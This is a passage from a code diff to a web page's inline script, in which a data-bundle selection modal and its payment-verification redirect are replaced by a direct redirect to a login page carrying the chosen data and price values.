+        </div>
+    </footer>
 
     <script>
-        let selectedBundle = { offer: '', data: '', price: '' };
-
-        function selectBundle(offer, data, price) {
-            selectedBundle = { offer, data, price };
-            document.getElementById('modalOffer').textContent = offer;
-            document.getElementById('modalData').textContent = data;
-            document.getElementById('modalPrice').textContent = '$ ' + price;
-            document.getElementById('bundleModal').classList.add('active');
+        function selectBundle(data, price) {
+            window.location.href = `login.html?data=${encodeURIComponent(data)}&price=${price}`;
         }
-
-        function closeModal() {
-            document.getElementById('bundleModal').classList.remove('active');
-        }
-
-        function proceedToPayment() {
-            const { offer, data, price } = selectedBundle;
-            window.location.href = `verify-payment.html?offer=${encodeURIComponent(offer)}&data=${encodeURIComponent(data)}&price=${encodeURIComponent(price)}`;
-        }
-
-        window.addEventListener('click', (e) => {
-            const modal = document.getElementById('bundleModal');
-            if (e.target === modal) closeModal();
-        });
     </script>
 </body>
 </html>
